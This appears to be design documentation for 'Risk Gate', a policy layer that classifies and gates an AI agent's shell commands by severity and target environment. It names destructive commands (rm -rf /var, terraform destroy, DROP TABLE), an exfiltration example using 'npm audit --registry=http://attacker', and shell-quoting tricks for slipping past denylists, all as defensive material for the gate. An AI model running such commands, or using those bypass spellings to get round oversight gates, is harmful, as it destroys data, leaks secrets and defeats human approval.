# Risk Gate

> **Status: complete (Phase 7 #1 through #6).** The Risk Gate is live
> and authoritative at the `harness policy intercept` boundary. The
> interceptor builds the Action Envelope (#2), classifies risk (#3),
> resolves the environment (#4), evaluates `policy.when:` (#5), and
> enforces the four-way `allow / warn / require_approval / deny`
> decision (#6): `deny` and `require_approval` abort the tool call,
> `require_approval` clears once a `risk-approved:${SESSION_ID}` ledger
> tag exists (written by `harness approve risk`). The built-in
> `dangerous-shell` classifier + `gate-prod-destructive` policies ship
> in `harness init --template full`, and `harness doctor` reports Risk
> Gate wiring health. See [`ROADMAP.md`](ROADMAP.md#phase-7--risk-gate).

## What the Risk Gate is

The Phase 4 policy layer evaluates one rule per matching trigger and
returns a binary `block` / `allow`. It matches on the *tool call*: a
tool name, an optional command regex, an optional path glob.

The Risk Gate classifies *the action itself* before deciding. Between
the inbound tool event and the policy decision it inserts four stages:

```
Tool call
  → Action Envelope Builder   normalise the runtime event into a stable shape
  → Context Resolver          classify the target environment
  → Risk Classifier           assign severity + categories + reversibility
  → Policy Evaluator          match when: + requires: against the enriched envelope
  → Decision                  allow | warn | require_approval | deny
```

The motivating failure mode: an agent runs `psql $PROD_DB -c 'DROP TABLE
users;'`, `kubectl delete namespace prod`, or `terraform destroy`
against an unverified production target. A bare regex can spot `DROP
TABLE`, but whether that is safe depends on context the regex cannot
see: is `$PROD_DB` production or a disposable test container, is there
an approval on record, is the action reversible. The Risk Gate makes
that context a first-class, declarative input to the decision.

Long-form design and rationale:
[`lava-ice-logs/2026-04-30/harness-risk-gate-extension.md`](https://github.com/LanNguyenSi/lava-ice-logs/blob/master/2026-04-30/harness-risk-gate-extension.md).

## Where the Risk Gate lives

The Risk Gate lives **entirely inside harness**, layered onto the
Phase 4 `harness policy intercept` runtime. It is not a separate CLI and
not an `agent-grounding` component.

```
harness          declares and enforces the boundary  (this feature)
agent-grounding  records and verifies the evidence    (the ledger backend)
agent runtime    proposes actions
hooks            integration surface into the runtime
```

This is not a new split: `harness policy intercept` is already the
`PreToolUse` runtime path, and it already reads the evidence ledger
through `grounding-mcp` (`ledger_summary` to query, `ledger_add` to
record decisions). The Risk Gate extends that existing path with the
envelope / classifier / resolver stages. `agent-grounding` gains no
risk-gate code: a `require_approval` decision is satisfied by an
ordinary ledger tag, written by a `harness approve` verb and read by the
same requires-evaluator the Phase 4 policies already use.

## Manifest reference

### Risk classifiers (`risk:`)

*Status: parsed and validated (Phase 7 #1). Consumed by the Risk
Classifier as of Phase 7 #3, inspectable with `harness test-risk`. Wired
into `harness policy intercept` as of Phase 7 #5.*

```yaml
risk:
  classifiers:
    - name: dangerous-shell        # unique within risk.classifiers[]
      tool: Bash                   # the tool whose input the patterns run against
      patterns:
        - pattern: 'rm\s+-rf\s+(/|/var|/data|/mnt|~)'
          categories: [destructive, data_loss]
          severity: critical
        - pattern: 'terraform\s+destroy'
          categories: [destructive, infrastructure_change]
          severity: critical
```

Each `patterns[]` entry maps a regular expression to a set of
`categories` and a `severity`. The regex is validated at parse time;
an unparseable pattern is a `harness validate` error.

`severity` is a closed, ordered scale: `low`, `medium`, `high`,
`critical`. The ordering is what a `when.risk.severity_at_least` clause
compares against.

`categories` is a closed enum, deliberately fixed rather than
free-form so a typo (`data-loss` for `data_loss`) is a validate-time
error instead of a clause that silently never matches:

`destructive`, `data_loss`, `production_mutation`, `credential_access`,
`secret_exfiltration`, `network_exfiltration`, `deployment_change`,
`infrastructure_change`, `privilege_escalation`, `irreversible_action`,
`mass_update`.

A new category is a schema addition, not operator config. If a team
needs a category outside this set, that is a signal to extend the enum
in a PR, not a reason to make the field free-form. Operator-defined
categories are a possible v2 escape hatch, noted but not committed.

#### Built-in benign harness commands

Before any operator classifier runs, the Risk Classifier recognizes
harness's own read-only and gate-producer subcommands as a `low`-severity
floor. Without it, those commands would be unclassified, and the
"unknown is not safe" rule (below) would let a
`when: { risk.severity_at_least: critical, environment.name: production }`
policy HARD-DENY `harness preflight` the moment a session resolves to
production (a `main` / `release` branch), deadlocking against the
`require-preflight-evidence` gate that demands that very command.

The recognized commands are: `preflight`, `session-start`, `approve`,
`doctor`, `validate`, `describe`, `list`, `diff`, `explain`,
`explain-action`, `explain-policy`, `test-risk`, `resolve-env`, `audit`,
`session-export`, `dry-run`, `export`, `help`. Mutating subcommands
(`apply`, `init`, `add`, `adopt`, `remove`, `pack`, `uninstall`,
`migrate-home`, `smoke`, `gate`, `pause`, `resume`) are deliberately
excluded and stay classifiable.

It is a floor, not an override:

- It composes under the same highest-severity-wins rule, so
  `harness preflight && rm -rf /var` still classifies `critical`: the
  dangerous tail wins and the command stays blocked.
- An operator classifier can only *raise* severity above the floor (a
  `critical` pattern on a harness command wins); it cannot sink below it.
- The match is anchored at the command head. `cd /repo && harness preflight`
  is *not* recognized and stays unclassified (fail-safe = denied): a
  benign prefix must not launder a non-harness command.

Inspect it with `harness test-risk`: the debug verb reports the same
classification the runtime gate uses.

#### Built-in read-only commands

A second `low`-severity floor recognizes any *provably read-only* Bash
command (`git status`, `git diff`, `grep`, `cat`, `ls`, `head`, `cd`,
`npm audit`, `npm ls`, `sort FILE`, `tree DIR`, `file FILE`, ...),
reusing the same metachar-hardened classifier the understanding gate uses
to allow reads without an approved report
(`src/runtime/read-only-bash.ts`). It exists for the same reason as the
harness-command floor: without it, a release cut on a `main` / `release/*`
branch resolves to production and the "unknown is not safe" fail-close
lets a prod-scoped `risk.severity_at_least` policy deny harmless reads
(`git diff`, `grep version package.json`) mid-release. The recurring
workaround was `harness pause`, which silences *every* gate during the
most sensitive flow; this floor removes that incentive (friction-log
#38/#40/#43/#50).

Some bins are classified read-only only when their write flags are absent
(per-bin guards, analogous to `find`):

- `sort`: read-only when none of its write or exec flags appear: `-o` /
  `--output` (output file), `--compress-program=PROG` (runs an arbitrary
  program on spill temp files, an exec vector), or `-T` /
  `--temporary-directory` (scratch write to a caller-chosen path). Output
  is also caught in a short-flag cluster containing `o`, and the temp-dir
  flag in a cluster containing uppercase `T`. The guard enumerates every
  write/exec vector, not just output redirection.
- `tree`: read-only when neither `-o` / `--output` (separate, glued, or
  long-with-equals) nor a short-flag cluster containing `o` appears. tree
  has no exec or temp-dir flag.
- `file`: read-only when neither `-C` / `--compile` nor a short-flag
  cluster containing uppercase `C` appears. Lowercase `-c` (magic-file
  check) is benign and is not blocked.

Two more entries floor a whole class of commands that were previously
unclassified and, on a production-resolved session (checked-out `main`
or `release/*`), blocked by a prod-scoped `risk.severity_at_least`
policy even though neither can write anything:

- `cd`: read-only unconditionally, like `pwd`. `cd` mutates only the
  invoking shell process's own working directory; it cannot write to
  the filesystem or touch production, and it has no flag whose value is
  an output path, so it needs no per-bin write-flag guard. A chained or
  redirected form (`cd /x && rm -rf /`, `cd $(evil)`) never reaches this
  floor: it is refused up front by the same shell-metacharacter /
  substitution guard described below, so only the bare navigation form
  is ever classified read-only.
- `npm`: a curated positive allowlist of read-only subcommands — `ls` /
  `list` (installed tree), `view` / `info` / `show` (registry metadata;
  `info` and `show` are npm's own aliases for `view`), `outdated`,
  `why` / `explain` (dependency-reason report), `ping` — plus `npm
  audit` and `npm audit signatures` (both reports). Only CANONICAL
  spellings are floored: aliases like `la` / `ll` (for `ls -la` / `ls
  -l`) and `v` (for `view`) are deliberately excluded, and stay gated
  rather than miscategorized.

  `npm audit fix` mutates the lockfile and `node_modules` and stays
  gated even though bare `npm audit` is floored. This is enforced as a
  POSITIVE shape, not a denylist on the literal word `fix`: every token
  after `audit` must either start with `-` (a flag) or be the literal
  `signatures`, or the whole command forfeits the floor. A denylist on
  `fix` is a shell-quoting bypass — `npm audit "fix"`, `'fix'`, `f''ix`,
  `fi"x"`, and `$'fix'` all reach npm as the plain argument `fix` (npm's
  own arg parsing strips the quoting) while none of those raw tokens
  equals the string `fix`, so an equality check on the untouched argv
  would silently pass every one of them through to the mutating path.
  The positive shape closes all such spellings, and any future npm
  subcommand this floor has not reasoned about, in one rule; it fails
  closed on any separated flag value (e.g. `npm audit --audit-level
  high`, `npm audit --omit dev`), an acceptable, conservative false
  negative — use the glued `--flag=value` form to stay floored.
  Deliberately NOT blocked: `npm audit -fix` (single dash) — verified
  npm 11.17.0 behavior is `Unknown cli config "--fix"`, report only, not
  the mutating `fix` arm.

  A `--registry` (including the per-scope `--@scope:registry` override),
  `--userconfig`, or `--globalconfig` token anywhere in an npm invocation
  forfeits the floor regardless of subcommand: these redirect npm's
  registry or config lookups to an operator-unverified location, so
  `npm audit --registry=http://attacker` (or the scoped
  `--@myorg:registry=http://attacker`) would submit the full dependency
  manifest to that host — exfiltration, not a safe read. This guard is a
  CLI-token check only: it does not and cannot see `registry` set via
  `.npmrc` or the `npm_config_registry` environment variable, which
  redirect npm identically but leave no argv trace.

  Every other npm subcommand (`install`, `ci`, `publish`, `update`,
  `version`, ...) stays unclassified: the allowlist is positive, not a
  denylist, so an npm verb this floor has not reasoned about is never
  assumed safe.

Bins excluded entirely from the floor (no per-bin guard possible):

- `uniq`: its output file is a positional operand, not a flag; detecting
  a write would require operand counting rather than flag scanning.
- `date`: the write flag `-s` (set clock) is ambiguous inside getopt
  clusters shared with benign flags (e.g. `-Iseconds` is `date -I
  FMT=seconds`, not `-I -s econds`).
- `hostname`: `hostname NAME` sets the hostname via a positional operand,
  not a flag.

The same guarantees hold:

- It is a floor, not an override: an operator classifier that flags a
  read-only command still wins, and a dangerous tail
  (`git diff && rm -rf /var`) keeps the higher severity.
- It only floors *read-only* commands. Mutations stay classifiable:
  `git commit` / `git push` / `git tag` / `npm version` are not floored,
  so gating the actual release mutations behind an operator override is
  unchanged.
- Any shell chaining, redirection, or command substitution forfeits the
  classification, so a write cannot be laundered behind a read-only head
  (`cat x > /etc/y`, `git diff | sh`, `$(...)` all stay unclassified and
  gated). The classifier inspects the full, uncapped command for this
  reason, so a write hidden past the 16 KiB subject cap cannot slip
  through either.

### Environment resolvers (`environments:`)

*Status: parsed and validated (Phase 7 #1). Consumed by the Context
Resolver as of Phase 7 #4, inspectable with `harness resolve-env`.
Wired into `harness policy intercept` as of Phase 7 #5.*

```yaml
environments:
  resolvers:
    - name: production-signals     # unique within environments.resolvers[]
      environment: production      # production | staging | dev | local
      signals:
        branch_patterns: [main, "release/*"]
        env_var_patterns:
          - var: DATABASE_URL
            patterns: [prod, production]
        kube_context_patterns: [".*prod.*"]
        kube_namespace_patterns: [prod, production]
```

A resolver asserts a single `environment` when any of its `signals`
match. At least one of the four signal kinds must be present, a
resolver with no signals can never fire and is a validate error.

The `environment` a resolver asserts is one of `production`, `staging`,
`dev`, `local`. The fifth name, `unknown`, is the implicit fallback
when no resolver matches, so a resolver cannot assert it: "unknown is
not safe" means policy treats the no-match case as risk-bearing, it
does not mean a resolver hand-labels something unknown.

Pattern match semantics per signal kind, as implemented by the Phase 7
#4 resolver:

- `branch_patterns` and `kube_namespace_patterns`: `*`-globs (only `*`
  is special, e.g. `release/*`). Matched against the envelope's git
  branch and the current kube namespace.
- `kube_context_patterns`: regexes (e.g. `.*prod.*`). Matched against
  the current kube context name.
- `env_var_patterns`: substrings of the named variable's value (e.g.
  `DATABASE_URL` containing `prod`).

Signals within a resolver are OR-ed: a resolver fires when any one
signal matches. When several resolvers fire and disagree, the
most-dangerous environment wins (`production > staging > dev > local`).
Branch comes from the Action Envelope; env vars and the kube
context/namespace are ambient inputs the `resolve-env` wrapper resolves
(`~/.kube/config` is read best-effort).

`kube_context_patterns` are operator-authored regexes compiled at
resolution time. As with `risk.classifiers[].patterns`, harness does
not screen them for catastrophic backtracking: a manifest is operator-
trusted config, so a pathological pattern is a self-inflicted hazard.

### Risk-aware match clauses (`policy.when:`)

*Status: parsed and validated (Phase 7 #1). Evaluated by `harness
policy intercept` as of Phase 7 #5, inspectable with `harness
explain-policy <policy> --event <event.json>` (the trigger match, risk
classification, resolved environment, and a per-clause `when:`
breakdown for a hypothetical event).*

A policy may carry an optional `when:` block. As of Phase 7 #5 a
declared `when:` is ANDed onto the policy's `trigger:` match and
evaluated against the enriched Action Envelope: the policy fires only
when `trigger:` AND every `when:` clause hold. A policy with no `when:`
matches on `trigger:` alone, exactly as in Phase 4.

```yaml
policies:
  - name: gate-prod-destructive
    description: Require approval for destructive production actions.
    trigger:
      event: PreToolUse
      match: "Bash"
    when:
      risk.severity_at_least: high          # high or critical
      risk.category_in: [destructive, data_loss]
      environment.name: production          # production|staging|dev|local|unknown
      action.reversible: false
    requires:
      ledger_tag: "risk-approved:${SESSION_ID}"
    hook: risk-gate
    enforcement: block
```

Every clause is optional; an empty `when: {}` is rejected as a silent
no-op. `when.environment.name` may test `unknown`, the only place the
unmatched-environment case is addressable.

A `when:`-bearing policy still carries the Phase 4 `requires:`,
`hook:`, and `enforcement:` fields, all of them required by the schema.
Phase 7 #5 kept them mandatory: a `require_approval` policy expresses
its approval gate through `requires:` (the `risk-approved:${SESSION_ID}`
ledger tag), so the Phase 4 requires-evaluator is reused unchanged. A
pure risk policy that decides from `when:` alone, without ledger
evidence, would be a structural change to the policy model and is not
Phase 7 scope; it remains a possible future relaxation.

### Unclassified actions and the fail-close rule

The "unknown is not safe" rule means that any action the Risk Classifier
does not recognise (no classifier pattern matched) satisfies every
`risk.severity_at_least`, `risk.category_in`, and `action.reversible`
clause automatically. The `environment.name` clause is exempt: the
Context Resolver always returns a concrete environment (the no-match case
resolves to the matchable name `unknown`), so it is always a real
equality test.

**The footgun:** a policy that gates on `risk.*` or `action.reversible`
clauses WITHOUT an `environment.name` scope fires on every unclassified
command in every environment. A command the classifier does not recognise
satisfies the risk clause by fail-close, and with no environment scope
the policy never gets to exclude non-production sessions.

**The correct pattern** is to pair any risk clause with an
`environment.name` scope:

```yaml
policies:
  - name: deny-unclassified-in-production
    description: >
      Block unrecognised commands in production. Without environment.name,
      this policy would fire on every unclassified command in every
      environment because the fail-closed unclassified rule makes
      risk.severity_at_least match anything the classifier did not
      recognise. The environment.name clause restricts the gate to the
      session that actually resolves to production.
    trigger:
      event: PreToolUse
      match: Bash
    when:
      risk.severity_at_least: high          # also fires fail-closed on unclassified
      environment.name: production          # REQUIRED: scopes to production only
    requires:
      ledger_tag: "risk-approved:${SESSION_ID}"
    hook: risk-gate
    enforcement: block
```

Without `environment.name: production`, the policy above would fire on
every Bash call the classifier does not recognise, in every environment,
including local development sessions on non-production branches.

**`harness validate` warns on the footgun.** A policy with any of
`risk.severity_at_least`, `risk.category_in`, or `action.reversible` in
its `when:` block but no `environment.name` clause produces a
`severity: "warning"` diagnostic pointing at this section.

**The audit record and block-time deny message now flag the footgun.** When
a policy fires because the action was unclassified (not because the
classifier returned a real match), the `PolicyDecision` record carries
`whenUnclassifiedFallback: true`. This field is serialised into the
`policy_decision` ledger row and surfaces as follows:

- **`harness audit` (table):** the `reason` column is annotated with
  `[unclassified-fallback]` so a fail-closed match is immediately visible
  in the human-readable table.
- **`harness audit --json`:** the `whenUnclassifiedFallback: true` field
  appears on the JSON decision object, enabling programmatic inspection.
- **`harness explain <policy> --trace --json`:** the `whenUnclassifiedFallback`
  field appears in the JSON trace projection, letting an operator or
  script distinguish a fail-closed unclassified deny from a real
  critical-severity match.
- **Block-time deny message (non-`ux:` policies):** the deny reason
  appends `(matched via the fail-closed unclassified rule, not a real risk
  classification)` before the hint suffix so the agent-facing message
  identifies the cause at a glance.

Policies that declare a `ux:` block are not altered: the operator chose
the exact wording of the agent-facing surface; the flag still rides the
audit record and is still visible in `harness audit` and `explain --trace`.

## Decision model

*Status: all four outcomes are evaluated and enforced as of Phase 7 #6.
`deny` and `require_approval` abort the tool call; `allow` and `warn`
let it proceed.*

The Phase 4 decision space is `allow` / `deny`, selected by
`enforcement: block | warn`. Phase 7 extends it to four outcomes, with
`require_approval` added as a third `enforcement` value:

| Decision | Meaning |
|---|---|
| `allow` | Action may proceed. |
| `warn` | Action proceeds; a warning is recorded and surfaced. |
| `require_approval` | Action is blocked until matching approval evidence exists in the ledger. |
| `deny` | Action is blocked. |

**Degraded mode.** (Revised by task f1aea826; the paragraph below replaces
the original fail-open-for-every-tier contract.) When the evidence ledger
cannot answer (grounding-mcp absent, unresponsive, or past its timeout
budget), the evaluator cannot form a real verdict — and what happens next
is now derived from the policy's own `enforcement:`. A `warn` policy
degrades to the non-blocking `warn-degraded` exactly as before:
advisory friction never bricks the session. A `block` or
`require_approval` policy fails CLOSED with the blocking `deny-degraded`
outcome: a gate whose purpose is preventing a specific irreversible
incident must not open because its evidence became unreadable (measured
2026-08-06: a 1-100ms ledger timeout flipped a `git push` deny to ALLOW
while every broken-ledger-path shape correctly denied). The
`deny-degraded` envelope names the degraded cause instead of a missing
tag — producing the required evidence cannot unblock an unreadable
ledger — plus the recovery path (`harness doctor`, retry) and the
opt-out. The decision is recorded to the audit trail; when the pooled
connection's timeout latch would drop exactly that row, the client
retries once over a fresh session (same timeout budget, never more than
one extra spawn per invocation).

Operators who prefer the previous availability-first behaviour set
`risk.degraded_fail_posture: fail_open` in the manifest, which restores
the old mapping (every degraded evaluation → non-blocking
`warn-degraded`) for every tier. The default is `preserve_enforcement`.

Two boundaries this contract cannot reach: the OUTER hook layer treats a
hook that exceeds its own `budget_ms` as allow (harness hook contract),
so hook budgets must stay comfortably above the ledger timeout or the
fail-closed decision is never delivered; and a wedged fail-closed gate
whose fix itself needs the gate (the deadlock case, task 78b95a63) has
two designed escapes: the `fail_open` opt-out (named in the envelope's
recovery text) and the operator-only `harness pause` kill switch, which
is honoured BEFORE manifest load and therefore silences the policy
gates even when the manifest or ledger is exactly what is broken.

`require_approval` reuses the Phase 6 approval mechanism unchanged: a
ledger tag (working name `risk-approved:${SESSION_ID}`) written by a
`harness approve` verb and read by the existing requires-evaluator. This
is the same pattern as `understanding-approved:${SESSION_ID}`. It is why
`agent-grounding` needs no new code: it already stores arbitrary tags
through `ledger_add`.

## Open questions, resolved

The source design closes with seven open questions. The four that gate
Phase 7's shape are resolved here; the remaining three are deferred with
a reason.

- **Risk Gate inside harness, or a separate `risk-gate` CLI?**
  Inside harness. The classifier and resolver consume `harness.yaml`;
  `policy intercept` is already the `PreToolUse` runtime path. A
  separate CLI would only re-import the harness manifest schema for no
  benefit at this scope.
- **Inline policies, imported bundles, or both?**
  Inline for Phase 7, consistent with the Phase 4 decision (ROADMAP
  "Open decisions resolved here" §4): runtime-firing policies live in
  `harness.yaml policies:`. `risk.classifiers[]` and
  `environments.resolvers[]` are likewise inline. Bundling is a v2
  concern.
- **How is explicit approval represented in the ledger?**
  As a ledger tag, reusing the Phase 6 pattern. No new evidence
  primitive, no `agent-grounding` change.
- **Production detection: deny-by-default or approval-by-default?**
  Approval-by-default for `high`, deny-by-default for `critical`
  production actions, and `require_approval` for `unknown`. This is the
  built-in `dangerous-shell` policy's stance (Phase 7 #6); operators
  override per policy. Rationale: a `critical` production mutation
  (`terraform destroy`, `rm -rf /var/lib/...`) has no benign reading, a
  hard `deny` is correct; a `high` action may be legitimate with an
  approval on record.
- **Break-glass / temporary override:** deferred. Out of scope for
  Phase 7; tracked as a future open question.
- **Deterministic rules vs LLM-assisted classification:** deterministic
  rules only for Phase 7. LLM-assisted review is a v2+ knob.
- **Cross-runtime support (OpenCode, Codex, custom MCP runtimes):**
  deferred. Phase 7 targets the Claude Code `PreToolUse` surface; the
  envelope shape is designed to be runtime-neutral, but adapters are a
  later effort.

## See also

- [`docs/ROADMAP.md` Phase 7](ROADMAP.md#phase-7--risk-gate) for the
  six-sub-task decomposition.
- [`docs/ARCHITECTURE.md` §6](ARCHITECTURE.md) for the
  `policies:` / `requires:` / `grounding-mcp` wiring the Risk Gate
  composes on top of.
- `docs/examples/full-manifest.yaml` for a worked `dangerous-shell`
  classifier and `production-signals` resolver.
